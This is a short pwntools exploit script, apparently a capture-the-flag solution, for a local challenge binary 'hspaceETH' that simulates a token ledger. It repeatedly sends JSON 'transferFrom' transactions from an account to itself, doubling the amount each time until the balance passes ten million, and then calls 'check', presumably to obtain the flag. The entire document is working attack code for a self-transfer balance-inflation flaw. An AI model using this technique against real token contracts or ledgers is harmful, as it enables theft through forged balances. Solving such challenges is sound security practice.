from pwn import *

p = process('./hspaceETH')

p.recvuntil(b': ')
p.sendline(b'1234')

balance = 16

while balance < 10000000:
    p.recvuntil(b'Tx : ')
    pay = b'{"method" : "transferFrom", "sender" : %d, "recipient" : %d, "amount": %d}' % (0xf104, 0xf104, balance)
    p.sendline(pay)
    balance *= 2

p.recvuntil(b'Tx : ')
pay = b'{"method" : "balanceOf", "account" : %d}' % (0xf104)
p.sendline(pay)

p.recvuntil(b'Tx : ')
pay = b'{"method" : "check", "account" : %d}' % (0xf104)
p.sendline(pay)

p.interactive()